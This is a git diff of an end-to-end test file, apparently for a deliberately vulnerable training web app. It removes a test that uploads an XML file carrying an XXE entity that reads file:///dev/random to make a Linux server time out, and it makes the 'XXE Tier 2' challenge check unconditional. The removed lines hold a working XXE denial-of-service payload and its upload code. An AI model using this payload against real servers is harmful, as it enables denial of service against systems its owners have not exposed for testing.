@@ -93,28 +93,6 @@ describe('/#/complain', () => {
       browser.driver.sleep(3000)
       browser.waitForAngularEnabled(true)
     })
-
-    if (!process.env.TRAVIS_BUILD_NUMBER) {
-      it('should be possible to trigger request timeout on Linux server via .xml upload with /dev/random XXE attack', () => {
-        browser.waitForAngularEnabled(false)
-        browser.executeScript(() => {
-          const data = new FormData()
-          const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
-          data.append('file', blob, 'xxeDosForLinux.xml')
-
-          const request = new XMLHttpRequest()
-          request.open('POST', '/file-upload')
-          request.send(data)
-        })
-        browser.driver.sleep(3000)
-        browser.waitForAngularEnabled(true)
-      })
-    }
-
-    afterAll(() => {
-      if (!process.env.TRAVIS_BUILD_NUMBER) {
-        protractor.expect.challengeSolved({ challenge: 'XXE Tier 2' })
-      }
-    })
+    protractor.expect.challengeSolved({ challenge: 'XXE Tier 2' })
   })
 })
